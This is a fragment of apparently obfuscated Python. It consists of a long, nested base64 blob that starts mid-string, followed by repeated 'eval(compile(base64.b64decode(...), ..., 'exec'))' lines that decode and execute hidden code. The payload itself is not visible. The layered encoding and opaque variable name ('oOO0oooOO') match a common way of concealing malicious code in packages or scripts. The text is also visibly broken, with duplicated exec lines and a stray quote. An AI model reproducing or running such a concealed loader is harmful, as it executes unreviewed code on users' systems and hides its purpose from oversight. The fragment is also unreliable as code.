FZTYmsxR2FFbGhSMnhPVW01bk1GUlhjRTlaTWxaRldUTmtXVk5IWkRSWFZsbzBUa1pzV0ZadFRteFNSVlY0VjBWb2JtUXdOVWRsUkZKUVVrVkthbHBWWkZwbGJHaEpXbnBHVG1KSVp6QlhiWEJQV1RKV1JWZFVTbGxUUjJONVZGUkdORTVGTlRaV2JVNXNVa2RTYjFkRmFHNU5WVEZIWlVSU1dtRnRlR3BhVlZKVFlXeG9TVnA2VWs1U2JtY3dWR3RTVjFreVZrVmFSM2haVTBka05GUlZXalJPUm5CMFZHMU9iRkl3VlRCWFJXaHVUV3hzYzJWRVVrOWhiVkpxV2xWU1dtVldhRWxhZWtaUFlraG5NRlJ0TVVkWk1sWklWRmhvV1ZOSFpEVlVhMW8wVGtVMU5sTnRUbXhTTUhCdlYwVm9ibVZyTlZkbFJGSk9aV3R3YWxwVlVrSk9SbWhKV25wU1RrMVlaekJYV0hCSFdUSldSVmRZYUZsVFIyUTFWMjE0TkU1R2JGaFRiVTVzVWpCc05sZEZhRzloUlRWSFpVUlNXbVZzU21wYVZXUkxZVEZvU1ZvelpFNWlTR2N3VkdwS1lWa3lWa1ZTVkVKWlUwZGplVlJWV2pST1JUVjBWbTFPYkZKSGFHOVhSV2h1VFdzeGMyVkVVazVTTVhCcVdsVlNXazVHYUVsaFIzQk9WbTVuTUZRd1VrOVpNbFpJVTFSR1dWTkhhSEpVYWtZMFRrVXhXRmR0VG14U01HdzJWMFZvYms1Vk1YTmxSRkpoVmpCd2FscFZVa0psYkdoSlducFNUbEp1WnpCVWFrcGhXVEpXU0ZWVVJsbFRSMk13VjJ4YU5FNUZNWEZoUjA1c1VrVmFjRmRGYUc5aVZteHpaVVJTV2sxcmNHcGFWVkpPWkRGb1NWcDZUbHBXYm1jd1ZHeFNZVmt5VmtWV1dIQlpVMGRvZEZkVVJqUk9SVEZZVTIxT2JGSkZiRFZYUldodllsWndWMlZFVWxCU01IQnFXbFZTUm1Wc2FFbGFlazVhWWtobk1GUlZaRXRaTWxaRldrZG9XVk5IWkRWVVZsbzBUa1p3Y1ZOdFRteFNNWEJ5VjBWb2JtVnJOSGhsUkZKaFVrVTFhbHBWWkZOaFZtaEpXak53WVZadVp6QlViWEJMV1RKV1JXRjZRbGxUUjJONVYxUkdORTVGTlZWaVIwNXNVakExY2xkRmFHOWhWVGxIWlVSU1QxWXdOV3BhVlZKV1RURm9TV0ZIYUU1U2JtY3dWMVJLUjFreVZraFZiWEJaVTBka05WUldXalJPUlRsRlVtMU9iRkl3Y0hCWFJXaHZZa1p3VjJWRVVrNVdNVXBxV2xWU1FrMHhhRWxhZWs1UFRWaG5NRlF3WkZOWk1sWkZWVmhrV1ZOSFpETlViRTVxWTBOSlMxcFlXbWhpUTJocVlqSXhkMkZYZUd4TFIwcG9ZekpWTWs1RE5XbE9hbEpyV2xkT2RscEhWVzlpTURsUVRVYzVkbUl3T1ZCTFUzZG5TV3A0ZW1SSVNuQmliV01yU1dsM1owb3lWalJhVjAxdVMxTnJQU0lLWlhaaGJDaGpiMjF3YVd4bEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb2IwOVBNRzl2YjA5UEtTd2dJanh6ZEhKcGJtYytJaXdnSjJWNFpXTW5LU2s9IgpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShvT08wb29vT08pLCAiPHN0cmluZz4iLCAnZXhlYycpKQ=="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))